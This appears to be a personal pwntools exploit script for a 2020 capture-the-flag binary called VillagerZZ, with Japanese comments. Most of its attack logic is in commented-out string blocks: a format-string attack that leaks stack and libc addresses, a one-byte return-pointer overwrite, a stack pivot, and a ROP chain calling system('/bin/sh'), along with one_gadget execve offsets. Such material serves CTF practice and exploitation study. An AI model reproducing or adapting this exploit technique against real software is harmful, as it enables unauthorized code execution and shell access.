from pwn import *
elf_file = FILENAME = '/home/k1zuna/D/2020/nitic/VillagerZZ'
elf = context.binary = ELF(elf_file)
#context.log_level = 'debug' # output verbose log




HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc_ver = "libc6_2.31-0ubuntu9_amd64" libc_database

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  c = process(FILENAME)
  sleep(1)
  pid = gdb.attach(c,gdbscript='''\
  b main

  ''')



def send_payload(payload):
    log.info(f"payload = {payload}")
    c.send(payload)
    return c.recv()


c.interactive()

"""
while True:
  c = process(['./VillagerZ'])
  try:
    vuln = 0xb3
    ret_ptr_fs = 6 + (0x00007fff9e1acf18- 0x00007fff9e1ace30) // 8
    libc_ptr_fs = 6 + (0x00007fff9e1acf58- 0x00007fff9e1ace30) // 8
    padding = 0x00007ffdebe7ee08- 0x00007ffdebe7ed20
    

    payload  = f"%{vuln}c%{ret_ptr_fs}$hhn"
    payload += f"|%{ret_ptr_fs}$p|%{libc_ptr_fs}$p|"
    payload += "A" * (padding - len(payload)) + '\x48'
    #0x00007fff9e1acf18│+0x00f0: 0x00007fff9e1acf40 ➡ 0x00007fff9e1acf48 overwrite

    log.info(f"payload = {payload}")
    c.sendafter('name?\n',payload)#1/16

    leaks = c.recvuntil('name?\n').split(b'|')# EOF error catch

    pid = gdb.attach(c,gdbscript='''
   
    ''')


    stack_leak = int(leaks[1],16)
    libc_leak = int(leaks[2],16)
    log.info(f"stack_leak = {hex(stack_leak)}")
    libc.address = libc_leak - (libc.sym["__libc_start_main"] + 0xf3)
    log.info(f"libc_base = {hex(libc.address)}")
    target_address = stack_leak-0x20

    leave = 0x35
    #mov rsp, rbp
    #pop rbp
    ret_ptr_fs = 6 + (0x00007ffec7ad2c18 - 0x00007ffec7ad2b30) // 8
    rbp_ptr_fs = 6 + (0x00007ffec7ad2b88 - 0x00007ffec7ad2b30) // 8
    rbp = stack_leak - 0x8
    rop_ptr = ((stack_leak - 0x00007ffec7ad2c48 + 0x00007ffec7ad2b70) & 0xffff) - 0x8
    log.info(f"rop_ptr = {rop_ptr}")
    payload2  = "".encode()

    payload2 += f"%{leave}c%{ret_ptr_fs}$hhn".encode()
    payload2 += f"%{rop_ptr - leave}c%{rbp_ptr_fs}$hn".encode()
    payload2 += b'A' * (0x40 - len(payload2))
    payload2 += p64(libc.address+0x00163ccc)#40
    payload2 += p64(next(libc.search("/bin/sh\x00")))#48
    payload2 += p64(libc.sym["system"])#50
    payload2 += p64(rbp)#58

    log.info(f"payload2 = {payload2}")
    log.info(f"payload2 = {len(payload2)}")
    c.send(payload2)

    c.interactive()
    break
  except EOFError:
    pass
  c.close()
#0x7fffe1fd6b48
"""




"""
0xe6aee execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe6af1 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe6af4 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

"""

"""
fmtstr = FmtStr(execute_fmt=send_payload,offset=6,overflows)
fmtstr.write(target_address,libc.address+0x00163ccc)#prdi
fmtstr.write(target_address+0x8,next(libc.search("/bin/sh\x00")))
fmtstr.write(target_address+0x10,libc.sym["system"])
fmtstr.execute_writes()
"""



# 0x00007ffdebe7ed20などはGDBで入手

# ret_ptr_fsはBOFで1byte書き換えた後のアドレス
#(元々はstack内を指すアドレスをmain+1cのアドレスに変更)

# padding+ '\x38' はその書き換えを行うための物

# main+1cへのリターンアドレスを指すret_pts_fsに向けてFSA、1byte書き換えてvulnに書き換える


